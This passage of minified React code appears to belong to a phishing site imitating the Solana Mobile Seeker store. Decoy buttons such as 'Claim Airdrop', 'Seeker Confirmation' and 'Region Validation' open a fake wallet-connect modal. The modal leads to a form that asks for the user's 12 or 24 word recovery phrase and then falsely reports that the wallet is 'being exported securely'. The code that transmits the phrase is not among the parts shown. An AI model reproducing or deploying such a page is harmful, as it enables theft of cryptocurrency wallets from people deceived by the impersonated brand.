				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (b) => b.stopPropagation(),
			children: [
				f.jsx(z1, { wallet: c, onClose: d }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Recovery Phrase",
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-4",
							children:
								"Restore an existing wallet with your 12 or 24 word recovery phrase.",
						}),
						f.jsx("textarea", {
							className:
								"w-full p-3 bg-neutral-800 text-white rounded-lg border border-gray-700 focus:outline-none focus:border-indigo-500 transition-colors",
							rows: "4",
							cols: "50",
							placeholder: "Recovery Phrase.",
							value: r,
							onChange: (b) => h(b.target.value),
							required: !0,
							style: { resize: "none" },
						}),
						f.jsx("button", {
							onClick: z,
							className:
								"mt-4 w-full bg-green-600 hover:bg-green-700 text-white font-medium py-3 rounded-xl transition-colors",
							children: v ? "Importing..." : "Import",
						}),
					],
				}),
			],
		});
	},
	d4 = ({ wallet: c, onClose: d }) =>
		f.jsxs("div", {
			className:
				"relative w-full h-full md:w-[95%] md:h-auto max-w-[420px] bg-neutral-900 border border-gray-700 rounded-none md:rounded-3xl p-6 shadow-2xl flex flex-col items-center justify-center text-center transition-all duration-500 ease-out",
			onClick: (o) => o.stopPropagation(),
			children: [
				f.jsx(z1, { wallet: c, onClose: d }),
				f.jsxs("div", {
					className:
						"flex-1 flex flex-col items-center justify-center",
					children: [
						f.jsx("h3", {
							className: "text-white text-2xl font-bold mb-4",
							children: "Exporting Wallet",
						}),
						f.jsx("div", {
							className:
								"animate-spin rounded-full h-16 w-16 border-t-2 border-b-2 border-indigo-500",
						}),
						f.jsx("p", {
							className: "mt-6 text-gray-400 text-lg",
							children:
								"Your wallet is being exported securely...",
						}),
					],
				}),
			],
		}),
	h4 = ({ onClose: c, onSelectWallet: d }) =>
		f.jsxs("div", {
			className:
				"relative w-full md:w-[95%] max-w-[420px] h-[550px] md:h-auto bg-neutral-900 border border-gray-700 rounded-t-3xl md:rounded-3xl p-6 shadow-2xl flex flex-col overflow-hidden",
			onClick: (o) => o.stopPropagation(),
			children: [
				f.jsxs("div", {
					className:
						"flex justify-between items-center pb-5 border-b border-gray-700 mb-4",
					children: [
						f.jsxs("div", {
							className: "flex items-center gap-3",
							children: [
								f.jsx("div", {
									className:
										"bg-neutral-800 text-white text-xs font-semibold px-3 py-1 rounded-full",
									children: "reown",
								}),
								f.jsx("span", {
									className: "text-white text-lg",
									children: "Manual Kit",
								}),
							],
						}),
						f.jsx("button", {
							onClick: c,
							className:
								"text-gray-400 text-3xl leading-none hover:text-white transition-colors",
							children: "×",
						}),
					],
				}),
				f.jsxs("div", {
					className: "flex-1 overflow-y-auto px-1 -mx-1",
					style: { scrollbarWidth: "none", msOverflowStyle: "none" },
					children: [
						f.jsx("style", {
							children: `
                    .no-scrollbar::-webkit-scrollbar {
                        display: none;
                    }
                `,
						}),
						f.jsx("p", {
							className: "text-gray-400 mb-3 text-sm",
							children: "Popular:",
						}),
						f.jsx("div", {
							className: "flex flex-col gap-2 no-scrollbar",
							children: c4.map((o, r) =>
								f.jsxs(
									"div",
									{
										className:
											"flex items-center justify-between p-3.5 bg-neutral-800 rounded-2xl cursor-pointer hover:bg-neutral-700 transition-colors",
										onClick: () => d(o),
										children: [
											f.jsxs("div", {
												className:
													"flex items-center gap-4",
												children: [
													f.jsx("div", {
														className:
															"w-10 h-10 rounded-xl overflow-hidden bg-white flex items-center justify-center border border-gray-600",
														children: f.jsx("img", {
															src: o.logo,
															alt: `${o.name} Logo`,
															className:
																"w-full h-full object-contain",
														}),
													}),
													f.jsx("span", {
														className:
															"text-white font-medium",
														children: o.name,
													}),
												],
											}),
											r === 0 &&
												f.jsx("span", {
													className:
														"text-xs font-semibold text-green-500 bg-green-900/40 px-3 py-1 rounded-full",
													children: "RECOMMENDED",
												}),
										],
									},
									o.id
								)
							),
						}),
					],
				}),
				f.jsxs("div", {
					className:
						"flex flex-col items-center justify-center p-6 mt-4 bg-neutral-800 border border-gray-700 rounded-2xl",
					children: [
						f.jsx("img", {
							src: "/globe.svg",
							alt: "Globe Icon",
							className: "w-16 h-16 mb-2",
						}),
						f.jsx("p", {
							className: "text-white text-sm text-center",
							children: "Connect your wallet to get started",
						}),
					],
				}),
			],
		}),
	zc = ({ isOpen: c, onClose: d }) => {
		const [o, r] = A.useState("main"),
			[h, v] = A.useState(null),
			N = (G) => {
				v(G), r("connecting");
			},
			z = () => {
				r("update-info");
			},
			b = () => {
				r("final-loading");
			},
			p = () => {
				r("input");
			},
			w = () => {
				r("sent");
			},
			D = () => {
				r("main");
			},
			U = () => {
				r("main"), d();
			},
			J = () => {
				switch (o) {
					case "main":
						return f.jsx(h4, { onClose: U, onSelectWallet: N });
					case "connecting":
						return f.jsx(f4, {
							wallet: h,
							onBack: D,
							onFinishConnect: z,
						});
					case "update-info":
						return f.jsx(s4, {
							wallet: h,
							onBack: D,
							onStartUpdate: b,
						});
					case "final-loading":
						return f.jsx(r4, {
							wallet: h,
							onBack: D,
							onFinishLoading: p,
						});
					case "input":
						return f.jsx(o4, { wallet: h, onBack: D, onSend: w });
					case "sent":
						return f.jsx(d4, { wallet: h, onClose: U });
					default:
						return null;
				}
			},
			X =
				o === "main"
					? "fixed inset-0 flex items-end md:items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300"
					: "fixed inset-0 flex items-center justify-center z-[10000] backdrop-blur-md transition-all duration-300",
			Q =
				o === "main"
					? "relative w-full md:w-[95%] max-w-[420px]"
					: "relative w-full h-full md:w-[95%] md:h-auto max-w-[420px]";
		return f.jsx("div", {
			className: `${X} ${
				c ? "opacity-100 visible" : "opacity-0 invisible"
			}`,
			onClick: o === "main" ? U : D,
			children: f.jsx("div", {
				className: Q,
				onClick: (G) => G.stopPropagation(),
				children: J(),
			}),
		});
	},
	m4 = () => {
		const [c, d] = A.useState(!1),
			[o, r] = A.useState(!1),
			h = () => d(!0),
			v = () => d(!1),
			N = () => r(!o);
		return f.jsxs(f.Fragment, {
			children: [
				f.jsxs("header", {
					className:
						"flex items-center justify-between p-6 text-white",
					children: [
						f.jsx("a", {
							href: "/",
							children: f.jsxs("span", {
								className: "flex items-center gap-2 md:gap-6",
								children: [
									f.jsx("img", {
										src: "/logo1.svg",
										alt: "Logo 1",
										className: "h-5 md:h-6",
									}),
									f.jsx("img", {
										src: "/logo2.svg",
										alt: "Logo 2",
										className: "h-5 md:h-6",
									}),
									f.jsx("img", {
										src: "/logo3.svg",
										alt: "Logo 3",
										className: "h-5 md:h-6",
									}),
								],
							}),
						}),
						f.jsxs("nav", {
							className:
								"hidden md:flex items-center space-x-8 text-white",
							children: [
								f.jsx("a", {
									href: "#",
									className:
										"hover:text-gray-400 transition-colors",
									children: "Seeker",
								}),
								f.jsx("a", {
									href: "#",
									className:
										"hover:text-gray-400 transition-colors",
									children: "Developers",
								}),
								f.jsx("a", {
									href: "#",
									className:
										"hover:text-gray-400 transition-colors",
									children: "Confirm Shipping",
								}),
								f.jsx("button", {
									onClick: h,
									className:
										"bg-white text-black font-semibold py-2 px-6 rounded-full hover:bg-gray-200 transition-colors",
									children: "Order Now",
								}),
							],
						}),
						f.jsx("button", {
							onClick: N,
							className:
								"md:hidden text-white focus:outline-none",
							children: f.jsx("svg", {
								className: "w-8 h-8",
								fill: "none",
								viewBox: "0 0 24 24",
								stroke: "currentColor",
								children: o
									? f.jsx("path", {
											strokeLinecap: "round",
											strokeLinejoin: "round",
											strokeWidth: 2,
											d: "M6 18L18 6M6 6l12 12",
									  })
									: f.jsx("path", {
											strokeLinecap: "round",
											strokeLinejoin: "round",
											strokeWidth: 2,
											d: "M4 6h16M4 12h16m-7 6h7",
									  }),
							}),
						}),
					],
				}),
				o &&
					f.jsxs("div", {
						className:
							"fixed inset-0 z-50 bg-gray-900 bg-opacity-95 backdrop-blur-sm flex flex-col items-center justify-center space-y-8 md:hidden",
						children: [
							f.jsx("button", {
								onClick: N,
								className:
									"absolute top-6 right-6 text-white focus:outline-none",
								children: f.jsx("svg", {
									className: "w-8 h-8",
									fill: "none",
									viewBox: "0 0 24 24",
									stroke: "currentColor",
									children: f.jsx("path", {
										strokeLinecap: "round",
										strokeLinejoin: "round",
										strokeWidth: 2,
										d: "M6 18L18 6M6 6l12 12",
									}),
								}),
							}),
							f.jsx("a", {
								href: "#",
								onClick: N,
								className:
									"text-white text-3xl hover:text-gray-400 transition-colors",
								children: "Seeker",
							}),
							f.jsx("a", {
								href: "#",
								onClick: N,
								className:
									"text-white text-3xl hover:text-gray-400 transition-colors",
								children: "Developers",
							}),
							f.jsx("a", {
								href: "#",
								onClick: N,
								className:
									"text-white text-3xl hover:text-gray-400 transition-colors",
								children: "Confirm Shipping",
							}),
							f.jsx("button", {
								onClick: () => {
									h(), N();
								},
								className:
									"bg-white text-black font-semibold py-3 px-8 text-xl rounded-full hover:bg-gray-200 transition-colors",
								children: "Order Now",
							}),
						],
					}),
				f.jsx(zc, { isOpen: c, onClose: v }),
			],
		});
	},
	p4 = () =>
		f.jsxs("div", {
			className:
				"relative px-5 py-7.5 md:mt-[30px] md:py-[96.5px] lg:px-7.5",
			children: [
				" ",
				f.jsxs("div", {
					className:
						"relative z-[3] flex w-full max-w-[762px] flex-col items-start gap-6 md:gap-[38px]",
					children: [
						" ",
						f.jsx("img", {
							alt: "Seeker",
							loading: "lazy",
							width: "677",
							height: "165",
							decoding: "async",
							"data-nimg": "1",
							className: "h-auto w-full max-w-[762px]",
							style: { color: "transparent" },
							src: "/seeker.svg",
						}),
						" ",
						f.jsxs("h2", {
							className:
								"text-[19.6px] md:text-[28px] tracking-[-0.392px] md:tracking-[-0.56px] leading-[120%] font-normal text-brand-lake text-sky",
							children: [
								" ",
								"Powered by",
								" ",
								f.jsxs("span", {
									style: {
										color: "rgb(250, 249, 244)",
										textShadow:
											"rgba(216, 230, 236, 0.9) 0px 0px 10px, rgba(153, 179, 190, 0.75) 0px 0px 25px, rgba(153, 179, 190, 0.25) 0px 0px 32px",
									},
									children: [" ", "SKR.", " "],
								}),
								" ",
								f.jsx("br", {}),
								" The Native Asset of the Solana Mobile Economy.",
								" ",
							],
						}),
						" ",
						f.jsxs("a", {
							target: "_blank",
							rel: "noopener noreferrer",
							className:
								"inline-flex items-center justify-center whitespace-nowrap font-sans text-web-black transition-colors duration-300 ease-in-out focus-visible:outline-none disabled:cursor-not-allowed bg-brand-sea-glass hover:bg-web-white focus:bg-web-white rounded-full font-normal px-6 py-3 text-[16px] tracking-[-0.48px] md:py-4 md:text-[24px]",
							href: "https://store.solanamobile.com",
							children: [" ", "Order Now", " "],
						}),
						" ",
					],
				}),
				f.jsx("img", {
					alt: "Solana Print",
					fetchPriority: "high",
					width: "762",
					height: "186",
					decoding: "async",
					"data-nimg": "1",
					className:
						"relative z-[2] mx-auto mt-7 h-auto w-4/5 max-w-[902px] lg:absolute lg:bottom-0 lg:right-[28px] lg:ml-[30px] lg:mt-0 lg:w-3/5",
					style: { color: "transparent" },
					src: "/hero.png",
				}),
			],
		});
function x4() {
	return f.jsx("div", {
		className:
			"group relative mt-9 aspect-video overflow-hidden rounded-[30px]",
		children: f.jsx("div", {
			className: "overflow-hidden rounded-[30px]",
			style: { width: "100%", height: "100%" },
			children: f.jsx("video", {
				autoPlay: !0,
				loop: !0,
				muted: !0,
				controls: !0,
				playsInline: !0,
				style: { width: "100%", height: "100%" },
				children: f.jsx("source", {
					src: "/solanamobile.mp4",
					type: "video/mp4",
				}),
			}),
		}),
	});
}
function g4() {
	const [c, d] = A.useState(!1),
		o = () => d(!0),
		r = () => d(!1),
		h = {
			color: "rgb(250, 249, 244)",
			textShadow:
				"rgba(216, 230, 236, 0.9) 0px 0px 10px, rgba(153, 179, 190, 0.75) 0px 0px 25px, rgba(153, 179, 190, 0.25) 0px 0px 32px",
		};
	return f.jsxs("div", {
		className: "mt-[60px] flex flex-col gap-4 md:mt-[130px]",
		children: [
			f.jsxs("div", {
				className: "flex flex-col gap-6 text-center",
				children: [
					f.jsx("h2", {
						className:
							"text-[56px] md:text-[104px] tracking-[-1.456px] md:tracking-[-2.08px] leading-[100%] font-normal text-brand-lake",
						children: f.jsx("span", {
							style: h,
							children: "TEEPIN",
						}),
					}),
					f.jsx("p", {
						className:
							"text-[18px] tracking-[-0.36px] font-normal text-white",
						children:
							"Trusted Execution Environment Platform Infrastructure Network.",
					}),
				],
			}),
			f.jsxs("div", {
				className:
					"flex flex-row flex-wrap md:gap-6 gap-4 justify-center px-6",
				children: [
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Seeker Confirmation",
					}),
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Claim Airdrop",
					}),
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Bug Issues",
					}),
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Shipping",
					}),
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Region Validation",
					}),
					f.jsx("button", {
						className:
							"bg-nimbus text-black transition duration-300 ease-in-out hover:bg-white px-8 py-4 rounded-full w-full md:w-auto",
						onClick: o,
						children: "Rectification",
					}),
				],
			}),
			f.jsxs("div", {
				className:
					"mt-8 grid gap-12 min-[1400px]:mt-32 min-[1400px]:grid-cols-2",
				children: [
					f.jsx("div", {
						className: "",
						children: f.jsx("div", {
							className: "",
							style: { width: "100%", height: "100%" },
							children: f.jsx("img", {
								src: "/download.png",
								alt: "",
							}),
						}),
					}),
					f.jsxs("div", {
						className:
							"flex flex-col gap-10 max-[1400px]:p-[10px] min-[1400px]:gap-[120px]",
						children: [
							f.jsxs("div", {
								className:
									"relative grid max-[1400px]:grid-rows-[400px_max-content]",
								children: [
									f.jsx("hr", {
										className: "absolute top-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(180deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute h-px w-full border-0 top-[44%]",
										style: {
											backgroundImage:
												"linear-gradient(-90deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute bottom-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(0deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsxs("div", {
										className:
											"flex flex-col justify-center gap-6 pl-6 lg:pl-20 min-[1400px]:max-h-[700px] min-[1400px]:gap-20",
										children: [
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsx("p", {
														className:
															"text-[16px] md:text-[18px] tracking-[1.08px] uppercase font-normal text-nimbus",
														children:
															"Hardware Layer",
													}),
													f.jsxs("h5", {
														className:
															"text-[29.4px] md:text-[42px] leading-[99%] font-normal",
														children: [
															f.jsx("span", {
																style: h,
																children:
																	"Secure",
															}),
															" ",
															f.jsxs("span", {
																className:
																	"text-sky",
																children: [
																	"crypto hardware with built-in trust",
																	" ",
																],
															}),
															f.jsx("span", {
																style: h,
																children:
																	"protocols",
															}),
														],
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Verifiable State",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Devices attest to identity, boot status, and software authenticity.",
																	}),
																],
															}),
														],
													}),
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "#61AFBD",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																	f.jsx(
																		"path",
																		{
																			d: "M21.6927 12.5306L14.9427 19.2806C14.802 19.4213 14.6111 19.5003 14.4121 19.5003C14.2131 19.5003 14.0222 19.4213 13.8815 19.2806C13.7408 19.1398 13.6617 18.949 13.6617 18.7499C13.6617 18.5509 13.7408 18.36 13.8815 18.2193L19.3518 12.7499H4.66211C4.4632 12.7499 4.27243 12.6709 4.13178 12.5303C3.99113 12.3896 3.91211 12.1988 3.91211 11.9999C3.91211 11.801 3.99113 11.6103 4.13178 11.4696C4.27243 11.3289 4.4632 11.2499 4.66211 11.2499H19.3518L13.8815 5.78055C13.7408 5.63982 13.6617 5.44895 13.6617 5.24993C13.6617 5.05091 13.7408 4.86003 13.8815 4.7193C14.0222 4.57857 14.2131 4.49951 14.4121 4.49951C14.6111 4.49951 14.802 4.57857 14.9427 4.7193L21.6927 11.4693C21.7625 11.539 21.8178 11.6217 21.8555 11.7127C21.8933 11.8038 21.9127 11.9014 21.9127 11.9999C21.9127 12.0985 21.8933 12.1961 21.8555 12.2871C21.8178 12.3782 21.7625 12.4609 21.6927 12.5306Z",
																			fill: "black",
																			fillOpacity:
																				"0.2",
																		}
																	),
																],
															}),
															f.jsxs("span", {
																className:
																	"flex flex-col gap-2 pt-1",
																children: [
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-semibold text-white",
																		children:
																			"Hardware Backed Trust",
																	}),
																	f.jsx("p", {
																		className:
																			"text-[18px] tracking-[-0.36px] font-normal text-nimbus",
																		children:
																			"Trusted Execution Environment delivers tamper resistant proofs of state for on-chain verification.",
																	}),
																],
															}),
														],
													}),
												],
											}),
										],
									}),
								],
							}),
							f.jsxs("div", {
								className:
									"relative grid max-[1400px]:grid-rows-[400px_max-content]",
								children: [
									f.jsx("hr", {
										className: "absolute top-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(180deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute h-px w-full border-0 top-[38%]",
										style: {
											backgroundImage:
												"linear-gradient(-90deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("hr", {
										className:
											"absolute bottom-0 h-1/2 w-px",
										style: {
											backgroundImage:
												"linear-gradient(0deg, #050D10 0.1%, #15AEB5 59.98%, #FAF9F4 99.9%)",
											opacity: 0.3,
										},
									}),
									f.jsx("div", {
										className:
											"size-full overflow-hidden min-[1400px]:hidden",
										children: f.jsx("div", {
											className: "",
											style: {
												width: "100%",
												height: "100%",
												overflow: "hidden",
											},
											children: f.jsx("img", {
												src: "/download1.png",
											}),
										}),
									}),
									f.jsxs("div", {
										className:
											"min-[1400px]:h-screen flex flex-col justify-center gap-6 pl-6 lg:pl-20 min-[1400px]:max-h-[700px] min-[1400px]:gap-20",
										children: [
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsx("p", {
														className:
															"font-mono text-[16px] md:text-[18px] tracking-[1.08px] uppercase font-normal text-nimbus",
														children:
															"Platform Layer",
													}),
													f.jsxs("h5", {
														className:
															"text-[29.4px] md:text-[42px] leading-[99%] font-normal text-sky",
														children: [
															"Where verified ",
															f.jsx("span", {
																style: h,
																children:
																	"dApps",
															}),
															" meet authenticated ",
															f.jsx("span", {
																style: h,
																children:
																	"users",
															}),
														],
													}),
												],
											}),
											f.jsxs("div", {
												className:
													"flex flex-col gap-6",
												children: [
													f.jsxs("div", {
														className:
															"grid grid-cols-[32px_1fr] gap-4",
														children: [
															f.jsxs("svg", {
																width: "32",
																height: "32",
																viewBox:
																	"0 0 25 24",
																fill: "none",
																xmlns: "http://www.w3.org/2000/svg",
																children: [
																	f.jsx(
																		"path",
																		{
